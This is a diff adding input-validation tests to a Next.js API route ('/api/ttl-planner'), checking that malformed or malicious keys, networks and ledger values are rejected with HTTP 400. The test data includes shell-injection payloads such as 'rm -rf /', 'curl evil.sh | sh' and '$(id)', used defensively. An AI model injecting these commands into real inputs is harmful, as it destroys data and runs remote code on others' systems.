@@ -41,4 +41,68 @@ describe("POST /api/ttl-planner", () => {
     const res = await POST(req);
     expect(res.status).toBe(400);
   });
+
+  const post = (payload: unknown) =>
+    POST(
+      new NextRequest("http://localhost/api/ttl-planner", {
+        method: "POST",
+        body: JSON.stringify(payload),
+        headers: { "Content-Type": "application/json" },
+      })
+    );
+
+  it("rejects an unknown network", async () => {
+    const res = await post({
+      keys: ["AAAA"],
+      newLiveUntilLedger: 5000000,
+      network: "testnet; rm -rf /",
+    });
+    expect(res.status).toBe(400);
+  });
+
+  it.each([
+    'AAAA" ; curl evil.sh | sh ; echo "',
+    "AAAA$(id)",
+    "AAAA`id`",
+    "AAAA\nstellar",
+    "AAAA BBBB",
+    "A".repeat(201),
+    "",
+  ])("rejects malicious or invalid key %j", async (key) => {
+    const res = await post({
+      keys: [key],
+      newLiveUntilLedger: 5000000,
+      network: "testnet",
+    });
+    expect(res.status).toBe(400);
+  });
+
+  it("rejects non-string keys", async () => {
+    const res = await post({ keys: [123], newLiveUntilLedger: 5000000 });
+    expect(res.status).toBe(400);
+  });
+
+  it.each(["5000000; id", 1.5, -1, 0, Number.MAX_SAFE_INTEGER + 2, null])(
+    "rejects invalid newLiveUntilLedger %j",
+    async (v) => {
+      const res = await post({ keys: ["AAAA"], newLiveUntilLedger: v });
+      expect(res.status).toBe(400);
+    }
+  );
+
+  it("rejects a non-object body", async () => {
+    const res = await post(null);
+    expect(res.status).toBe(400);
+  });
+
+  it("accepts all allowed networks", async () => {
+    for (const network of ["testnet", "mainnet", "futurenet"]) {
+      const res = await post({
+        keys: ["AAAA"],
+        newLiveUntilLedger: 5000000,
+        network,
+      });
+      expect(res.status).toBe(200);
+    }
+  });
 });
